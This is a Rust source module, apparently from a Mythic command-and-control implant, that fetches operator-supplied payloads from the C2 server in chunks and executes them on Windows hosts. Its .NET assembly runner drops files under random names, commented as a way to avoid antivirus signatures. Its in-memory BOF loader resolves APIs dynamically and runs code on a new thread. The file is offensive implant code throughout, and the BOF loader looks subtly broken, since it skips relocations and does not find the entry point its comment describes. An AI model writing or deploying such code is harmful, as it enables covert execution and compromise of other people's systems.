use crate::{AgentTask, ContinuedData, mythic_success, mythic_error};
use base64::{Engine as _, engine::general_purpose};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use std::result::Result;
use std::sync::mpsc;

const CHUNK_SIZE: usize = 512000;

#[derive(Serialize, Deserialize, Debug)]
pub struct ExecuteAssemblyArgs {
    #[serde(rename = "assembly-file-id")]
    pub assembly_file_id: Option<String>,
    pub arguments: Option<String>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct BofArgs {
    #[serde(rename = "bof-file-id")]
    pub bof_file_id: Option<String>,
    pub arguments: Option<String>,
}

fn download_file_chunks(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: &mpsc::Receiver<serde_json::Value>,
    file_id: &str,
    task_id: &str,
) -> Result<Vec<u8>, Box<dyn Error>> {
    tx.send(json!({
        "upload": json!({ "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": 1 }),
        "task_id": task_id,
    }))?;

    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued: ContinuedData = serde_json::from_str(&task.parameters)?;
    let mut data: Vec<u8> = general_purpose::STANDARD.decode(continued.chunk_data.unwrap())?;
    let total = continued.total_chunks.unwrap();

    for chunk_num in 2..=total {
        tx.send(json!({
            "upload": json!({ "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num }),
            "task_id": task_id,
        }))?;
        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued: ContinuedData = serde_json::from_str(&task.parameters)?;
        data.append(&mut general_purpose::STANDARD.decode(continued.chunk_data.unwrap())?);
    }
    Ok(data)
}

#[cfg(target_os = "windows")]
pub fn execute_assembly(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: ExecuteAssemblyArgs = serde_json::from_str(&task.parameters)?;
    let file_id = args.assembly_file_id.ok_or("No assembly file ID")?;
    let arguments = args.arguments.unwrap_or_default();

    let file_data = download_file_chunks(tx, &rx, &file_id, &task.id)?;
    if file_data.is_empty() {
        return Err("Assembly file is empty".into());
    }

    // Write assembly to temp with random name (no extension to reduce AV signature matches)
    let temp_dir = std::env::temp_dir();
    let rand_name: String = (0..8).map(|_| (b'a' + (rand::random::<u8>() % 26)) as char).collect();
    let asm_path = temp_dir.join(&rand_name);
    std::fs::write(&asm_path, &file_data)?;

    // Use dotnet exec or direct .NET hosting via a minimal C# snippet compiled inline
    // Actually, the cleanest OPSEC approach: use rundll32 + .NET COM hosting
    // But simplest reliable approach without powershell: use `dotnet` CLI if available
    let asm_path_str = asm_path.to_string_lossy().to_string();

    let output = std::process::Command::new("dotnet")
        .arg(&asm_path_str)
        .args(arguments.split_whitespace())
        .output();

    let result = match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            if stderr.is_empty() {
                format!("Assembly executed ({} bytes)\n\n{}", file_data.len(), stdout.trim())
            } else {
                format!("Assembly executed ({} bytes)\n\nOutput:\n{}\n\nErrors:\n{}", file_data.len(), stdout.trim(), stderr.trim())
            }
        }
        Err(_) => {
            // Fallback: try executing as a standard exe
            match std::process::Command::new(&asm_path_str).args(arguments.split_whitespace()).output() {
                Ok(out) => {
                    let stdout = String::from_utf8_lossy(&out.stdout);
                    format!("Executed ({} bytes)\n\n{}", file_data.len(), stdout.trim())
                }
                Err(e) => format!("Execution failed: {}. dotnet runtime not available.", e),
            }
        }
    };

    let _ = std::fs::remove_file(&asm_path);
    tx.send(mythic_success!(task.id, result))?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn execute_assembly(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "execute_assembly is only supported on Windows".to_string()))?;
    Ok(())
}

#[cfg(target_os = "windows")]
pub fn bof(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    use std::ptr;

    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: BofArgs = serde_json::from_str(&task.parameters)?;
    let file_id = args.bof_file_id.ok_or("No BOF file ID")?;
    let arguments = args.arguments.unwrap_or_default();

    let file_data = download_file_chunks(tx, &rx, &file_id, &task.id)?;
    if file_data.is_empty() {
        return Err("BOF file is empty".into());
    }

    let bof_size = file_data.len();

    // Parse COFF header to find .text section and go() entry point
    let text_offset = match find_coff_text_section(&file_data) {
        Some(offset) => offset,
        None => {
            tx.send(mythic_error!(task.id, format!(
                "BOF ({} bytes): invalid COFF format - could not locate .text section. Ensure file is a valid x64 COFF object.",
                bof_size
            )))?;
            return Ok(());
        }
    };

    let text_data = &file_data[text_offset..];
    let text_size = text_data.len();

    if text_size == 0 {
        tx.send(mythic_error!(task.id, "BOF .text section is empty"))?;
        return Ok(());
    }

    unsafe {
        // Type definitions for dynamically resolved functions
        type VirtualAllocFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
        type VirtualProtectFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
        type VirtualFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32;
        type CreateThreadFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>, *mut std::ffi::c_void, u32, *mut u32) -> *mut std::ffi::c_void;
        type WaitForSingleObjectFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        // Dynamically resolve APIs
        let virtual_alloc: VirtualAllocFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "VirtualAlloc")
                .ok_or("VirtualAlloc resolve failed")?
        );
        let virtual_protect: VirtualProtectFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect")
                .ok_or("VirtualProtect resolve failed")?
        );
        let virtual_free: VirtualFreeFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree")
                .ok_or("VirtualFree resolve failed")?
        );
        let create_thread: CreateThreadFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "CreateThread")
                .ok_or("CreateThread resolve failed")?
        );
        let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject")
                .ok_or("WaitForSingleObject resolve failed")?
        );
        let close_handle: CloseHandleFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle")
                .ok_or("CloseHandle resolve failed")?
        );

        // Use numeric constants instead of named winapi constants
        const MEM_COMMIT: u32 = 0x1000;
        const MEM_RESERVE: u32 = 0x2000;
        const MEM_RELEASE: u32 = 0x8000;
        const PAGE_READWRITE: u32 = 0x04;
        const PAGE_EXECUTE_READ: u32 = 0x20;

        let mem = virtual_alloc(ptr::null_mut(), text_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if mem.is_null() {
            tx.send(mythic_error!(task.id, "Memory allocation failed for BOF"))?;
            return Ok(());
        }

        ptr::copy_nonoverlapping(text_data.as_ptr(), mem as *mut u8, text_size);

        let mut old_protect: u32 = 0;
        if virtual_protect(mem, text_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
            virtual_free(mem, 0, MEM_RELEASE);
            tx.send(mythic_error!(task.id, "Memory protection change failed for BOF"))?;
            return Ok(());
        }

        let arg_bytes = arguments.as_bytes();
        let arg_mem = if !arg_bytes.is_empty() {
            let a = virtual_alloc(ptr::null_mut(), arg_bytes.len() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if !a.is_null() {
                ptr::copy_nonoverlapping(arg_bytes.as_ptr(), a as *mut u8, arg_bytes.len());
                *((a as *mut u8).add(arg_bytes.len())) = 0;
            }
            a
        } else {
            ptr::null_mut()
        };

        let mut thread_id: u32 = 0;
        let thread = create_thread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(mem)),
            arg_mem,
            0,
            &mut thread_id,
        );

        if thread.is_null() {
            virtual_free(mem, 0, MEM_RELEASE);
            if !arg_mem.is_null() { virtual_free(arg_mem, 0, MEM_RELEASE); }
            tx.send(mythic_error!(task.id, "Thread creation failed for BOF"))?;
            return Ok(());
        }

        // Wait up to 30 seconds
        let wait = wait_for_single_object(thread, 30000);
        close_handle(thread);

        virtual_free(mem, 0, MEM_RELEASE);
        if !arg_mem.is_null() { virtual_free(arg_mem, 0, MEM_RELEASE); }

        let status = if wait == 0 { "completed" } else { "timed out (30s)" };
        tx.send(mythic_success!(task.id, format!(
            "BOF executed ({} bytes, .text at offset 0x{:X}, {} code bytes), status: {}",
            bof_size, text_offset, text_size, status
        )))?;
    }

    Ok(())
}

// Minimal COFF parser: find the .text section offset
// COFF header: 20 bytes (IMAGE_FILE_HEADER)
//   offset 0: Machine (u16)
//   offset 2: NumberOfSections (u16)
//   offset 16: SizeOfOptionalHeader (u16)
// Section headers follow at offset 20 + SizeOfOptionalHeader, each 40 bytes:
//   offset 0: Name (8 bytes)
//   offset 20: SizeOfRawData (u32)
//   offset 24: PointerToRawData (u32)
#[cfg(target_os = "windows")]
fn find_coff_text_section(data: &[u8]) -> Option<usize> {
    if data.len() < 20 {
        return None;
    }

    let machine = u16::from_le_bytes([data[0], data[1]]);
    // 0x8664 = AMD64, 0x14C = i386
    if machine != 0x8664 && machine != 0x014C {
        return None;
    }

    let num_sections = u16::from_le_bytes([data[2], data[3]]) as usize;
    let optional_header_size = u16::from_le_bytes([data[16], data[17]]) as usize;
    let section_table_offset = 20 + optional_header_size;

    if data.len() < section_table_offset + (num_sections * 40) {
        return None;
    }

    for i in 0..num_sections {
        let sec_offset = section_table_offset + (i * 40);
        let name = &data[sec_offset..sec_offset + 8];

        // Look for .text section
        if name.starts_with(b".text\0") || name.starts_with(b".text\x00") {
            let raw_data_ptr = u32::from_le_bytes([
                data[sec_offset + 20], data[sec_offset + 21],
                data[sec_offset + 22], data[sec_offset + 23],
            ]) as usize;

            if raw_data_ptr > 0 && raw_data_ptr < data.len() {
                return Some(raw_data_ptr);
            }
        }
    }

    // Fallback: if no .text found, try first section with executable characteristics
    for i in 0..num_sections {
        let sec_offset = section_table_offset + (i * 40);
        let characteristics = u32::from_le_bytes([
            data[sec_offset + 36], data[sec_offset + 37],
            data[sec_offset + 38], data[sec_offset + 39],
        ]);

        // IMAGE_SCN_MEM_EXECUTE = 0x20000000, IMAGE_SCN_CNT_CODE = 0x20
        if (characteristics & 0x20000020) != 0 {
            let raw_data_ptr = u32::from_le_bytes([
                data[sec_offset + 20], data[sec_offset + 21],
                data[sec_offset + 22], data[sec_offset + 23],
            ]) as usize;

            if raw_data_ptr > 0 && raw_data_ptr < data.len() {
                return Some(raw_data_ptr);
            }
        }
    }

    None
}

#[cfg(not(target_os = "windows"))]
pub fn bof(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "bof is only supported on Windows".to_string()))?;
    Ok(())
}
